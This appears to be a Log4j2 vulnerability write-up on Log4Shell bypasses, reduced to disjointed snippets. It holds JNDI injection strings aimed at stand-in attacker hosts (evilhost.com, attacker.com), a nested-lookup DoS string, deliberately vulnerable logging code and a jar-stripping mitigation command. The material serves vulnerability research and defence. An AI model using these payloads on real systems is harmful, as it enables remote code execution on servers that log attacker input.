+A new (non-default) pattern layout must be added to the Log4j2 configuration. The pattern layout must use a Context Lookup (${ctx:). An example of a vulnerable log4j2.properties file –
+# vulnerable in 2.14.1 even with ENV LOG4J_FORMAT_MSG_NO_LOOKUPS true
+appender.console.layout.pattern = ${ctx:useragent} - %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n
+Note that the Log4j2 configuration can be specified in many different ways, but in any case there are no default Context Lookup pattern layouts –
+
+${ctx:
+log4j2.properties
+The vulnerable application must use a Thread Context Map, where the attacker has control of the input data, for example:
+public void handle(HttpExchange he) throws IOException {
+    // userAgent is attacker-controlled
+    String userAgent = he.getRequestHeader("User-Agent"); 
+     
+    // Note that 1st argument matches the variable name from the configured pattern
+    ThreadContext.put("useragent", userAgent); 
+     
+    // The log message itself doesn't need to contain any message lookup
+    log.info("Received a request with User-Agent");
+    ...
+LOG4J_FORMAT_MSG_NO_LOOKUPS
+appender.console.layout.pattern = ${map:tainted} ...
+MapMessage msg = new StringMapMessage().with("message", "H").with("tainted", TAINTED);
+
+logger.error(msg);
+appender.console.layout.pattern = ${map:tainted} ...
+logger.info(new ObjectMessage(TAINTED));
+appender.console.layout.pattern = ${sd:tainted} ...
+StructuredDataMessage m = new StructuredDataMessage("1", "H", "event");
+m.put("tainted", TAINTED);
+
+logger.error(m);
+appender.console.layout.pattern = ${env:TAINTED_ENV_VAR} ...
+appender.console.layout.pattern = ${main:0} ...
+MainMapLookup.setMainArguments(args);
+
+logger.error("foo");
+
+Message lookups are disabled by default – Can be bypassed in specific configurations  (CVE-2021-45046 and more)
+
+allowedJndiProtocols – JNDI only allowed the following protocols by default – LDAP, LDAPS, Java (local) – No known bypass
+allowedJndiProtocols
+
+allowedLdapHosts – JNDI over LDAP may only access the local host by default (127.0.0.1/localhost) – Can be bypassed in specific operating systems (macOS, FreeBSD, Fedora, Arch Linux and Alpine Linux)
+allowedLdapHosts
+
+allowedLdapClasses – JNDI over LDAP may only load Java primitive classes by default – Can always be bypassed
+allowedLdapClasses
+
+Any one of the configurations specified in Appendix C
+
+If the application explicitly allowed for message lookup, by defining a pattern layout containing %m{lookups} in one of the configuration files. For example – appender.console.layout.pattern = %m{lookups}
+%m{lookups}
+appender.console.layout.pattern = %m{lookups}
+${jndi:ldap://127.0.0.1#evilhost.com:1389/a}
+evilhost.com
+UnknownHostException
+getAttributes
+lookup
+javaCodeBase
+trustURLCodebase
+javaClassName
+private static final List permanentAllowedClasses = Arrays.asList(Boolean.class.getName(),
+
+Byte.class.getName(), Character.class.getName(), Double.class.getName(), Float.class.getName(),
+
+Integer.class.getName(), Long.class.getName(), Short.class.getName(), String.class.getName());
+trustURLCodebase
+MapMessage
+appender.console.layout.pattern = ${map:tainted} - %-5p %c{1}:%L - %m%n
+${::-${::-${}}}
+IllegalStateException
+StrSubstitutor
+JndiLookup
+DataSource
+ldap://attacker.com:1337
+Logger logger = LogManager.getLogger("HelloWorld");
+log4j2.enableJndiJdbc
+JNDIManager
+java
+find ./ -type f -name "log4j-core-*.jar" -exec zip -q -d "{}" org/apache/logging/log4j/core/appender/db/jdbc/JdbcAppender.class \;
